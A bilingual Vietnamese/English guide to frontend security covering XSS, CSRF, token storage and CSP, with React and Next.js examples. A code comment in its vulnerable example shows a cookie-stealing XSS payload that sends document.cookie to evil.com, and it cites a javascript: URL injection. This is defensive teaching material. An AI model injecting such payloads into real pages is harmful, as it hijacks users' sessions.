# Frontend Security

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

> **Tóm tắt**: Hướng dẫn toàn diện về bảo mật frontend bao gồm XSS (Cross-Site Scripting), CSRF (Cross-Site Request Forgery), các chiến lược lưu trữ token an toàn (HttpOnly Cookies vs. localStorage), và Content Security Policy (CSP). Các lỗ hổng bảo mật frontend nhắm trực tiếp vào người dùng cuối và phiên làm việc (session) của họ.

</details>

> **Summary**: A comprehensive guide to frontend security covering XSS (Cross-Site Scripting), CSRF (Cross-Site Request Forgery), secure token storage strategies (HttpOnly Cookies vs. localStorage), and Content Security Policy (CSP). Frontend security vulnerabilities directly target end users and their sessions.

---

## ELI5 (Explain Like I'm 5)

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

Hãy tưởng tượng bạn đang xây một ngôi nhà (Website):
- **XSS**: Kẻ trộm lén viết một câu thần chú lên bức tường nhà bạn. Bất kỳ ai vào nhà đọc câu đó sẽ tự động móc ví đưa tiền cho hắn. (Phòng ngừa: Dùng sơn chống chữ - Xóa hết thẻ `<script>` mà user nhập vào).
- **Lưu trữ Token sai cách**: Bạn để chìa khóa két sắt (Access Token) ngay trên bàn phòng khách (`localStorage`). Trộm vào nhà là thấy ngay. (Phòng ngừa: Giấu chìa khóa vào két ẩn của ngân hàng — `HttpOnly Cookie`, chỉ ngân hàng mới lấy được).
- **CSRF**: Kẻ trộm gửi cho bạn một gói bưu phẩm. Khi bạn ký nhận, trên giấy biên nhận có ghi dòng chữ nhỏ "Tôi đồng ý chuyển toàn bộ tài sản cho kẻ trộm". Bạn đang phê duyệt giao dịch mà không hề hay biết!

</details>

Imagine you are building a house (Website):
- **XSS**: A thief secretly writes a magic spell on your wall. Anyone who walks in and reads it automatically hands over their wallet to the thief. (Prevention: Use anti-magic paint — Sanitize all `<script>` tags entered by users).
- **Improper Token Storage**: You leave the safe key (Access Token) right on the living room table (`localStorage`). Any thief walking in grabs it immediately. (Prevention: Hide the key in a bank vault — `HttpOnly Cookie`, which only the bank can access).
- **CSRF**: A thief sends you a package. When you sign for it, the receipt has tiny text saying, "I agree to transfer all my assets to the thief." You are approving a transaction without even knowing it!

---

## Layer 1: What is it? (What)

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

**Bảo mật Frontend** là tập hợp các phương pháp để bảo vệ ứng dụng web khỏi các cuộc tấn công khai thác môi trường của trình duyệt. Khác với backend (bảo vệ máy chủ và cơ sở dữ liệu), bảo mật frontend bảo vệ phiên đăng nhập (session), cookie, và dữ liệu cá nhân của người dùng.

**Phân loại:**
- **Loại**: Kỷ luật Bảo mật Ứng dụng.
- **Mối đe dọa chính**: XSS, CSRF, Clickjacking, Trộm token (Token theft), Tấn công chuỗi cung ứng (Supply chain).
- **Các lớp phòng thủ**: Làm sạch dữ liệu đầu vào (Sanitization), Header CSP, thuộc tính Cookie an toàn.

</details>

**Frontend Security** encompasses the practices and mechanisms used to protect web applications from attacks that exploit the client-side execution environment (browser). Unlike backend security, frontend attacks target the user's browser session, cookies, and personal data.

### Classification
- **Type**: Application security discipline.
- **Primary threats**: XSS, CSRF, clickjacking, token theft, supply chain attacks.
- **Defense layers**: Input sanitization, CSP headers, secure cookie attributes, Subresource Integrity (SRI).

---

## Layer 2: Why does it exist? (Why)

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

Trình duyệt rất "ngây thơ". Nó sẽ chạy mọi đoạn mã JavaScript mà nó thấy trên trang, bất kể mã đó là của bạn viết hay do hacker lén tiêm vào. Backend không thể cứu bạn nếu lỗi nằm ở cách trình duyệt hiển thị dữ liệu.

| Mối đe dọa | Hậu quả | Trách nhiệm của Frontend |
|---|---|---|
| XSS (Chạy mã độc) | Cướp phiên đăng nhập, trộm dữ liệu | Làm sạch input, tránh dùng `innerHTML`, thiết lập CSP |
| CSRF (Giả mạo yêu cầu) | Thực hiện hành động trái phép thay người dùng | Dùng cookie `SameSite`, token chống CSRF |
| Trộm Token | Chiếm đoạt hoàn toàn tài khoản | Dùng cookie `HttpOnly` thay vì `localStorage` |
| Clickjacking | Lừa người dùng click vào nút ẩn | Dùng header `X-Frame-Options` / `frame-ancestors` |

</details>

Browsers execute arbitrary JavaScript from any origin that manages to inject it into a page. This trust model creates attack surfaces that backend security alone cannot address:

| Threat | Impact | Frontend responsibility |
|---|---|---|
| XSS (Stored/Reflected/DOM) | Session hijacking, data theft | Sanitize inputs, avoid `innerHTML`, enforce CSP |
| CSRF | Unauthorized actions on behalf of user | Use `SameSite` cookies, anti-CSRF tokens |
| Token theft | Full account takeover | Use `HttpOnly` cookies instead of `localStorage` |
| Clickjacking | User tricked into clicking hidden elements | `X-Frame-Options` / CSP `frame-ancestors` |

---

## Layer 3: Without vs. With Comparison (Compare)

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

Không có bảo mật: Bạn cho phép người dùng viết bình luận. Một hacker viết bình luận chứa thẻ `<script>` gửi cookie về server của hắn. Bất kỳ ai mở bài viết đó lên đọc đều bị mất tài khoản ngay lập tức.
Có bảo mật: Bạn dùng thư viện (như `DOMPurify`) quét sạch mã độc trước khi hiển thị. Hacker viết `<script>`, thư viện sẽ xóa nó đi, chỉ giữ lại chữ thuần túy.

</details>

### Without proper security

```typescript
// Vulnerable: renders user-provided HTML directly
function Comment({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
  // If html contains <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
  // the attacker steals every viewer's session cookie
}

// Vulnerable: token in localStorage — accessible to any XSS
localStorage.setItem("token", accessToken);
```

### With proper security

```typescript
import DOMPurify from "dompurify";

// Safe: HTML is sanitized before rendering
function Comment({ html }: { html: string }) {
  const cleanHtml = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}

// Safe: token stored in HttpOnly cookie (set by backend)
// JavaScript cannot access HttpOnly cookies — immune to XSS theft
// The browser automatically attaches the cookie to requests
```

| Aspect | Without security | With security |
|---|---|---|
| User HTML rendering | Raw injection (XSS vector) | Sanitized with DOMPurify |
| Token storage | localStorage (XSS accessible) | HttpOnly cookie (JS inaccessible) |
| CSRF protection | None | SameSite cookie + CSRF token |
| Script injection | Unrestricted | CSP restricts allowed sources |

---

## Layer 4: Common Use Cases

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

1. **Nền tảng nội dung người dùng tạo (UGC)** — Bình luận blog, diễn đàn, bộ gõ văn bản phong phú (Rich Text) BẮT BUỘC phải làm sạch XSS.
2. **Luồng xác thực (Authentication)** — Lưu trữ token an toàn và làm mới tự động.
3. **Quản lý script bên thứ ba** — Nhúng mã Google Analytics, Ads, Chatbox (Rủi ro chuỗi cung ứng).
4. **Thanh toán E-commerce** — Bảo vệ CSRF cho form giỏ hàng và thanh toán.
5. **Dashboard Admin** — Yêu cầu quyền cao nhất nên phải có bảo vệ nhiều lớp (CSP + Auth chặt chẽ + CSRF).

</details>

1. **User-generated content platforms** — Blog comments, forum posts, rich text editors require XSS sanitization.
2. **Authentication flows** — Secure token storage and automatic token refresh.
3. **Third-party script management** — Analytics, ads, and widgets introduce supply chain risk.
4. **E-commerce checkout** — CSRF protection for payment and order submission forms.
5. **Admin dashboards** — Elevated privileges require defense-in-depth (CSP + strict auth + CSRF).

---

## Layer 5: Deep Practice

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

**1. Lưu trữ Token an toàn (Đặc biệt quan trọng)**:
Đừng BAO GIỜ lưu Access Token (JWT) trong `localStorage`. Bất kỳ lỗi XSS nào dù nhỏ nhất cũng sẽ khiến hacker đọc được chuỗi đó bằng lệnh `localStorage.getItem()`. Thay vào đó, Backend phải trả về `Set-Cookie: HttpOnly`. Cookie này được Trình duyệt giấu đi, JavaScript không thể đọc, nhưng trình duyệt tự biết cách gửi kèm khi gọi API.

**2. Tránh xa dangerouslySetInnerHTML**:
Nếu bạn phải dùng nó để render HTML (như nội dung Blog từ CMS), bắt buộc phải chạy qua hàm `DOMPurify.sanitize(html)` trước tiên.

**3. Content Security Policy (CSP)**:
Một tấm khiên phòng thủ cuối cùng. Bạn gửi lệnh cho Trình duyệt: "Chỉ được phép chạy Script có nguồn gốc từ domain của tôi, cấm tải từ domain khác". Dù XSS có lọt qua, trình duyệt cũng sẽ từ chối chạy đoạn mã đó vì vi phạm CSP.

</details>

### XSS Prevention

1. **React's built-in protection** — JSX expressions `{variable}` are automatically escaped. This prevents basic XSS.
2. **Avoid `dangerouslySetInnerHTML`** — When unavoidable, always sanitize with DOMPurify first.
3. **Never use `innerHTML` in vanilla JS** — Use `textContent` or DOM APIs instead.
4. **Sanitize URL inputs** — User-provided URLs in `href` can execute JavaScript: `javascript:alert(1)`.
5. **Validate on both client and server** — Client-side validation is a UX feature, not a security boundary.

### Secure Token Storage

| Storage | XSS vulnerable | CSRF vulnerable | Recommendation |
|---|---|---|---|
| `localStorage` | Yes — any JS can read it | No | Avoid for sensitive tokens |
| `sessionStorage` | Yes — any JS can read it | No | Avoid for sensitive tokens |
| `HttpOnly` Cookie | No — JS cannot access it | Yes (mitigated by `SameSite`) | **Recommended** |
| In-memory variable | No (unless XSS executes) | No | Good for short-lived access tokens |

**Recommended approach**: Backend sets the access token in an `HttpOnly`, `Secure`, `SameSite=Lax` cookie. The browser automatically attaches it to every request. Frontend JavaScript never handles the token directly.

### CSRF Protection

- **`SameSite=Lax` or `Strict` cookies**: The browser does not send cookies on cross-origin requests from other domains.
- **Anti-CSRF tokens**: Backend generates a unique token per session, embedded in forms as a hidden field. Cross-origin attackers cannot obtain this token.
- **Custom headers**: Require a custom header (e.g., `X-Requested-With`) on all state-changing requests. Browsers enforce CORS preflight for custom headers, blocking cross-origin requests.

### Content Security Policy (CSP)

CSP is an HTTP header that restricts which resources the browser is allowed to load.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.example.com
```

Even if an XSS vulnerability exists, CSP prevents the injected script from loading external resources or exfiltrating data to attacker-controlled domains.

### Best Practices

1. **Use `HttpOnly` cookies for authentication tokens** — Eliminates the primary XSS token theft vector.
2. **Deploy CSP headers in production** — Start with `report-only` mode to avoid breaking functionality.
3. **Never trust client-side input** — All validation must be duplicated on the server.
4. **Use Subresource Integrity (SRI)** for third-party CDN scripts to prevent supply chain attacks.
5. **Audit third-party dependencies** — Run `npm audit` in CI pipelines; use `Socket.dev` or `Snyk` for deep analysis.

### Common Pitfalls

1. **Storing JWTs in localStorage** — The most common frontend security mistake. Any XSS vulnerability exposes the token.
2. **Trusting `dangerouslySetInnerHTML` with unsanitized content** — Directly enables Stored XSS.
3. **CSP too permissive** — `script-src 'unsafe-inline' 'unsafe-eval'` negates CSP's protection entirely.
4. **Forgetting `SameSite` on cookies** — Without it, CSRF attacks are possible.
5. **Not validating `javascript:` URLs** — User-provided URLs in `href` can execute arbitrary code.

### Production Checklist

- [ ] Authentication tokens stored in `HttpOnly`, `Secure`, `SameSite=Lax` cookies.
- [ ] No `dangerouslySetInnerHTML` without DOMPurify sanitization.
- [ ] CSP header deployed (at minimum `default-src 'self'`).
- [ ] `npm audit` integrated into CI pipeline.
- [ ] SRI attributes on all third-party CDN scripts.
- [ ] URL inputs validated against `javascript:` protocol injection.

---

## Layer 6: Code Templates and Integration

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

Next.js cung cấp cách thiết lập CSP Header toàn cục dễ dàng trong file `next.config.ts`. Điều này chặn hoàn toàn các cuộc tấn công Clickjacking và hạn chế nguồn tải script.

</details>

### Next.js CSP Configuration

```typescript
// next.config.ts
const cspHeader = `
  default-src 'self';
  script-src 'self' 'nonce-{NONCE}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' blob: data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
`.replace(/\n/g, "");

const nextConfig = {
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          { key: "Content-Security-Policy", value: cspHeader },
          { key: "X-Frame-Options", value: "DENY" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
        ],
      },
    ];
  },
};

export default nextConfig;
```

---

## Related Topics

- [API Layer Design](./api-layer-design.md) — Token refresh interceptors and secure HTTP client configuration.
- [App Router & React Server Components](../03-nextjs/app-router-rsc.md) — Server-side authentication with Server Components.
- [Web Security (Fundamentals)](../../01-fundamentals/security/web-security.md) — OWASP Top 10 and foundational security concepts.
